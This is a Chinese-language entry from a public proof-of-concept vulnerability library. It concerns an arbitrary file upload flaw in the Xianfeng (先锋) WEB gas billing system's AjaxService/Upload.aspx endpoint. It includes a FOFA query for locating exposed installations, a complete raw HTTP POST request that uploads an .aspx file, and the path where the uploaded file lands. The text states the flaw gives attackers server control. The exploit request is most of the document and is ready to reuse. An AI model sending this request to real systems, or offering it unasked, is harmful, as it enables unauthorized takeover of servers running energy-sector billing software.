---

source: "wy876 漏洞文库"
---

# 先锋WEB燃气收费系统AjaxService存在任意文件上传漏洞

# 一、漏洞简介
先锋WEB燃气收费系统是由杭州先锋电子技术股份有限公司开发的一款服务于能源行业的系统，先锋WEB燃气收费系统存在文件上传漏洞，可导致攻击者获取服务器权限。

# 二、影响版本
+ 先锋WEB燃气收费系统

# 三、资产测绘
+ fofa`app="先锋WEB燃气收费系统"`
+ 特征


# 四、漏洞复现
```java
POST /AjaxService/Upload.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------38002115147665341923847377752
Content-Length: 710
Origin: null
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------38002115147665341923847377752
Content-Disposition: form-data; name="Fdata"; filename="1ndex.aspx"
Content-Type: text/html


123
-----------------------------38002115147665341923847377752
Content-Disposition: form-data; name="submit"

Submin
-----------------------------38002115147665341923847377752--
```


上传文件位置

```java
/UploadFile/202401/2024011004110066.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sra2po2of1g77mo7>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
